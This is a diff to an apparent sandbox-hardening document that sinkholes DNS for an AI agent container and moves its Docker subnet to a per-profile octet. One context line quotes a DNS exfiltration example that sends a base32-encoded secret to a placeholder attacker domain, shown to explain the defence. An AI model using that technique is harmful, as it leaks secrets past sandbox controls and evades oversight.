@@ -6,6 +6,8 @@
 
 The trap got tripped when audit H2 introduced the static `172.30.0.0/24` subnet + `ipv4_address` per service. For any change in that class, the procedure is:
 
+> **Since work/0001 A1 the third octet is per-profile** — `172.30.${SANDBOX_OCTET:-0}.0/24`, allocated by `profile.sh`. See "Per-profile subnet allocation" at the foot of this file. The `down`-not-`--force-recreate` rule below is unchanged and now matters more, because a profile's octet can legitimately change (pool collision) and moving a network under running containers is exactly the failure this doc exists to prevent.
+
 ```bash
 COMPOSE_PROFILES=db-postgres scripts/profile.sh <p> down
 COMPOSE_PROFILES=db-postgres scripts/profile.sh <p> rebuild
@@ -31,7 +33,7 @@ import socket; socket.getaddrinfo("base32-encoded-secret.attacker.tld", 0)
 
 The fix has three parts in compose:
 
-1. **Static subnet on `sandbox-internal`** (`ipam.config.subnet: 172.30.0.0/24`) — required to pin sibling IPs.
+1. **Static subnet on `sandbox-internal`** (`ipam.config.subnet: 172.30.${SANDBOX_OCTET:-0}.0/24`) — required to pin sibling IPs.
 2. **Static IPs on egress-proxy / postgres / mongo** (`networks.sandbox-internal.ipv4_address`).
 3. **`claude-agent` gets `dns: [127.0.0.1]`** (sinkhole — no resolver listens there) **plus `extra_hosts`** entries that pre-populate `/etc/hosts` with the three internal names.
 
@@ -43,3 +45,49 @@ End state: any `getaddrinfo("egress-proxy")` resolves via `/etc/hosts`. Any `get
 - `getent hosts egress-proxy` must succeed (internal hostnames still resolve).
 
 **Don't "fix DNS"** by reverting `dns:` to Docker's default or adding `127.0.0.11` to it — that re-opens the side channel. If a tool inside the container needs a new internal hostname, add it to `extra_hosts` (and pin its IP via `ipv4_address` if it's a service we own).
+
+---
+
+## Per-profile subnet allocation (work/0001 A1)
+
+**Why it exists.** `sandbox-internal` used to be hardcoded to `172.30.0.0/24`.
+Docker's IPAM pool is **global to the engine**, not scoped to a compose project,
+so a second profile's `up` failed with:
+
+```
+Error response from daemon: invalid pool request: Pool overlaps with other one on this address space
+```
+
+Distinct `COMPOSE_PROJECT_NAME`s do *not* prevent this — an earlier comment in
+`docker-compose.yml` claimed they did, and that was wrong.
+
+**How it works.** `SANDBOX_OCTET` drives the subnet, the three `ipv4_address`
+pins and the three `extra_hosts` entries from one variable:
+
+| Function | When | What it does |
+|---|---|---|
+| `ensure_subnet_octet` | every `profile.sh` command | reuse `<profiles>/<profile>/subnet-octet` if present; else pick the first octet free of other profiles' files, starting from `cksum(profile-name) % 256`. No docker calls. |
+| `ensure_octet_free` | only `up` / `recreate` / `rebuild` | scan live docker networks; if our `/24` is held by anything other than our own `sandbox-internal`, bump to the next free octet and rewrite the file. |
+
+`cksum` not `md5sum` — macOS has no `md5sum`. The whole allocator is in the
+bash-3.2 subset because `/usr/bin/env bash` on this host is 3.2.57.
+
+**One source of truth is the point.** DNS is sinkholed to `127.0.0.1`, so
+`extra_hosts` is the agent's *only* name-resolution path. If the pins and the
+hosts entries ever disagreed the agent would dial a dead IP — proxy mismatch
+kills all egress, DB mismatch is connection-refused. Deriving both from
+`SANDBOX_OCTET` makes that class of drift impossible. **Never write a literal
+third octet into `docker-compose.yml`.**
+
+**The `:-0` default** keeps the legacy `172.30.0.0/24` for direct
+`docker compose` calls that never create a network — `PROFILE=_test docker
+compose config`, and `restart` / `ps` / `down`, which act on the project by
+label. Any script calling a *network-creating* verb must go through
+`profile.sh`; this is why `setup.sh --recreate` delegates to
+`profile.sh recreate` instead of calling `docker compose` itself.
+
+**Migration.** A profile with no `subnet-octet` file reallocates off its name
+hash on next `up`, which rebuilds its network. `therapod` was pre-seeded with
+`0` so it stayed on the subnet it was already running (`echo 0 >
+<profiles>/therapod/subnet-octet`). Do the same for any pre-existing profile you
+do not want to move; a fresh profile needs nothing.
